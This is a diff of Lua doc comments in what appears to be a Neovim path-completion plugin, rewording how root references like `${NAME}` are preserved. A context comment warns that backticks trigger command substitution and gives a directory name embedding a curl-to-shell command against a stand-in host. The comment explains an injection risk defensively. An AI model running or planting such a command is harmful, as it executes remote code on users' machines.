@@ -150,9 +150,10 @@ M.register("BOOL", {
 --- Complete a path lead typed by the user -- or inserted by an earlier completion.
 ---
 --- A lead naming a root (`${NAME}/x`, `$NAME/x`) is completed on its expansion, and every
---- candidate is handed back in the spelling the user typed: `getcompletion` itself understands
---- neither `${NAME}` nor a root without an environment variable. A bare `$NA` completes the names of
---- the known roots.
+--- candidate is handed back with the root reference as the user typed it (`${NAME}` or `$NAME`):
+--- `getcompletion` itself understands neither `${NAME}` nor a root without an environment variable.
+--- The rest is the filesystem's own spelling with `.` / `..` resolved, so a step out of the root
+--- (`$NAME/..`) is not completed. A bare `$NA` completes the names of the known roots.
 ---
 --- A backtick in the lead is a command substitution to Vim's wildcard expansion: a directory named
 --- like "x`curl evil|sh`" in a downloaded folder would run its text the next time <Tab> is pressed
